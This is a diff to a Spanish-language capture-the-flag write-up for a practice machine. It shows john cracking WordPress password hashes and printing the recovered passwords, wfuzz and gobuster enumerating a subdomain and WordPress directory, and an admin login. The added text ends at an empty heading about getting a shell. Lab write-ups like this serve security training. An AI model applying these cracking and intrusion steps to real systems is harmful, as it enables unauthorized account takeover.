@@ -143,14 +143,88 @@ Enunciado :
               wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/
               wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/
 
-  5) Crakeamos las passwords con john.
+  5) Crakeamos las passwords con john, creamos un ficheros con estructura usuario:pass.
 
-     Creamos un ficheros con estructura usuario:pass 
+          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
+          └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_pass       
+          Using default input encoding: UTF-8
+          Loaded 4 password hashes with 4 different salts (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
+          Remaining 1 password hash
+          Cost 1 (iteration count) is 8192 for all loaded hashes
+          Will run 3 OpenMP threads
+          Press 'q' or Ctrl-C to abort, almost any other key for status
+          0g 0:00:21:37 DONE (2023-11-22 16:30) 0g/s 11050p/s 11050c/s 11050C/s  1looove..*7¡Vamos!
+          Session completed. 
+      
+          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
+          └─# john --show hash_pass 
+              wp_jeffrey:rockyou
+              wp_yura:soccer13
+              wp_eagle:xxxxxx
+
+  6) Acabamos de obtener credenciales de acceso a un wordpress, por lo que tendremos que buscar el panel de login.
+
+     - Despues de un buen rato haciendo fuzzing con gobuster en busca de directorios que nos aporten algo de info, no encontramos nada.
+       
+     - Probamos a realizar un ataque con WFUZZ para encontrar subdominios validos.
+    
+       NOTA: Anadimos el subdominio a nuestro fichero /etc/hosts.                                                                                          
+
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
+            └─# wfuzz -u http://wekor.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.wekor.thm" --hw 3 
+            ********************************************************
+            * Wfuzz 3.1.0 - The Web Fuzzer                         *
+            ********************************************************
+            
+            Target: http://wekor.thm/
+            Total requests: 4989
+            
+            =====================================================================
+            ID           Response   Lines    Word       Chars       Payload                                                                                                         
+            =====================================================================
+            
+            000000382:   200        5 L      29 W       143 Ch      "site - site"
+
+
+     - Vamos al subdominio  --> site.wekor.thm , obtenemos el siguiente mensaje.
+    
+       - Comenta que por el momento no hay nada aqui pero que en un par de semanas deberian tener un sitio web increible, fuzeamos el sitio a ver si han dejado algun directorio interesante.
+       
+         ![image](https://github.com/Esevka/CTF/assets/139042999/1f880486-ac11-4796-8b71-644a5dfac9cd)
+
+              ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/wekor]
+              └─# gobuster dir -u http://site.wekor.thm/ -w /usr/share/wordlists/dirb/common.txt -o fuzz_subdominio
+              ===============================================================
+              Gobuster v3.6
+              by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)       
+              ===============================================================
+              /.hta                 (Status: 403) [Size: 279]
+              /.htaccess            (Status: 403) [Size: 279]
+              /.htpasswd            (Status: 403) [Size: 279]
+              /index.html           (Status: 200) [Size: 143]
+              /server-status        (Status: 403) [Size: 279]
+              /wordpress            (Status: 301) [Size: 320] [--> http://site.wekor.thm/wordpress/]
+
+       - Cargamos el directorio -->wordpress, encontramos una plantilla wordpress poco trabajada, por lo que deducimos que el panel de login estara en el directorio por defecto --> wp-admin.
+
+          Tras loguearnos con los diferentes usuarios obtenidos anteriormente, el unico que tiene permisos de administrador es el usuario --> wp_yura:soccer13
+
+## Obtenemos Shell mediante Wordpress.
+
          
+      
+         
+           
+        
 
 
-  6) Acabamos de obtener credenciales par wordpress,llegadoss a este punto sabemos que debe
+       
 
+
+    
+       
+
+       
          
       
          
